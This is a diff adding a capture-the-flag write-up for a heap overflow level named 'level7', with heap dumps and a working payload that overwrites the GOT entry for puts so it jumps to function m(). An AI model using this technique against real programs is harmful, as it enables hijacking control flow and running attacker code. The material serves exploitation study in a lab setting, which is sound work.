@@ -82,8 +82,56 @@ puts@plt:
 
 
 
+```
+"-------HEAP-------"
+0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018
+0x804a010:	0x00000000	0x00000011	0x41414141	0x00000000
+0x804a020:	0x00000000	0x00000011	0x00000002	0x0804a038
+0x804a030:	0x00000000	0x00000011	0x42424242	0x00000000
+```
+  strcpy(0x0804a018, "AAAA")
+  strcpy(0x0804a038, "BBBB")
   
+  cpy whatever is in av1 into 018
+  cpy whatever is in av2 into 038
   
+  what we need is smthing like:
   
+    strcpy(addr_of_puts, addr_of_m)
+  
+  address of puts `0x8049928` and address of m() `0x080484f4`
+  
+  so we need to slide addr of puts to overide the aadr malloced for arv2
+  
+```
+  "-------HEAP-------"
+0x804a000:	0x00000000	0x00000011	0x00000001	[av1_dest]
+0x804a010:	0x00000000	0x00000011	[   av1  ]	0x00000000
+0x804a020:	0x00000000	0x00000011	0x00000002	[av2_dest]
+0x804a030:	0x00000000	0x00000011	[   av2  ]	0x00000000
+```
+we want to achieve smthg like
+```
+0x804a000:	0x00000000	0x00000011	0x00000001	[av1_dest]
+0x804a010:	0x00000000	0x00000011	[   av1  ]	0x00000000
+0x804a020:	0x00000000	0x00000011	0x00000002	[  puts  ]
+0x804a030:	0x00000000	0x00000011	[     m  ]	0x00000000
+```
+to reach `puts` frm `av1` we need  `4*5 = 20`
+
+payload:
+
+  `( python -c 'print A*20 + puts' ) ( python -c 'print m' )`
+  
+  `./level7 $(python -c 'print "A" * 20 + "\x08\x04\x99\x28"[::-1]') $(python -c 'print "\x08\x04\x84\xf4"[::-1]')`
+  
+  ```
+  "-------HEAP-------"
+0x804a000:	0x00000000	0x00000011	0x00000001	0x0804a018
+0x804a010:	0x00000000	0x00000011	0x41414141	0x41414141
+0x804a020:	0x41414141	0x41414141	0x41414141	0x08049928
+0x804a030:	0x00000000	0x00000011	0x00000000	0x00000000
+0x804a040:	0x00000000	0x00020fc1	0xfbad240c	0x00000000
+```
   
   
